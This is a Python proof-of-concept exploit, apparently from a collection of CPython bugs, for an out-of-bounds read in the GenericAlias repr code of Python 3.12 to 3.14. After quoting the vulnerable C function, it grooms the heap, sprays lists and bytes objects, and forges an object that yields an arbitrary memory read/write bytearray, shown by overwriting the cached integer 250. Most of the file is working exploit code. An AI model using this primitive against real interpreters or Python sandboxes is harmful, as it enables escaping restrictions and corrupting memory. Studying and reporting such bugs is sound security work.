"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: List size is cached before iterating through it allowing you to resize the list and read values out of bounds
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# in 3.12, the GenericAlias repr function was reworked to create the repr of a list manually (maybe for performance reasons? idk)
# this custom list repr function caches the list size, so you can shrink the list and it will try to access values out of bounds

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/genericaliasobject.c#L54-L82
"""
static int
ga_repr_items_list(_PyUnicodeWriter *writer, PyObject *p)
{
    assert(PyList_CheckExact(p));

    Py_ssize_t len = PyList_GET_SIZE(p); // <--- caches length here

    if (_PyUnicodeWriter_WriteASCIIString(writer, "[", 1) < 0) {
        return -1;
    }

    for (Py_ssize_t i = 0; i < len; i++) { // <--- see it uses cached length in loop
        if (i > 0) {
            if (_PyUnicodeWriter_WriteASCIIString(writer, ", ", 2) < 0) {
                return -1;
            }
        }
        PyObject *item = PyList_GET_ITEM(p, i);
        if (ga_repr_item(writer, item) < 0) { // <--- calls back to python code, can modify list here
            return -1;
        }
    }

    if (_PyUnicodeWriter_WriteASCIIString(writer, "]", 1) < 0) {
        return -1;
    }

    return 0;
}
"""

# The strategy we go for here is to do a bit of heap grooming, shrink and reallocate our list, and then put a bytes
# object after the list in memory that will contain a pointer to our fake object with a custom __repr__ we can use to extract
# the evil object (holy run-on sentence)

from common import check_pyversion, evil_bytearray_obj, addrof_bytes, p_long, PTR_SIZE

check_pyversion(introduced_ver=(3, 12, 0))

# see ./common/common.py for evil bytearray obj explanation
fake_ba, ba_addr = evil_bytearray_obj()

class catch:
    __slots__ = ("mem",)
    def __repr__(self):
        global mem
        mem = self.mem
        return "yes"

fake_obj = (
    p_long(0x54321) +
    p_long(id(catch)) +
    p_long(ba_addr)
)

class evil:
    def __repr__(self):
        evil_lst.clear() # completely wipes all list data
        _ref = [*prealloc_list_spray_data] # reclaim the memory we just cleared so we dont reuse it
        evil_lst.extend(prealloc_list_spray_data) # new reallocated memory will now be placed after our spray

        # this bytes object will be placed after our new reallocated list in memory.
        # due to the way we set up `evil_lst`, the next value that will have its repr taken
        # will be our fake object which will call catch.__repr__ where we extract our fake_ba object
        spray.append(p_long(addrof_bytes(fake_obj)).ljust(LIST_SIZE * PTR_SIZE - bytes.__basicsize__, b"A"))
        return "did we win?"

# can be any small value realistically, 10 isn't some special magic value
LIST_SIZE = 10

# here we do (LIST_SIZE + 3) because the bytes header is 0x20 bytes, so we need
# to append 4 extra items (each item is a ptr, so PTR_SIZE * 4) so that the ga repr func
# will take the repr of data in the actual bytes, not something in the header.
# so we add an extra 3 unused values + our evil() obj to fill in those 4 extra items 
evil_lst = [0] * (LIST_SIZE + 3) + [evil(), "no"]

prealloc_list_spray_data = [1] * LIST_SIZE

# spray to set up memory in the following format:
# list data + bytes obj + list data + bytes obj + ... + bytes obj
spray = [[*prealloc_list_spray_data] if i%2 else bytes(LIST_SIZE * PTR_SIZE - bytes.__basicsize__)
         for i in range(100)]

mem = None
'%r' % list[evil_lst]
if mem is None:
    exit('failed')

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100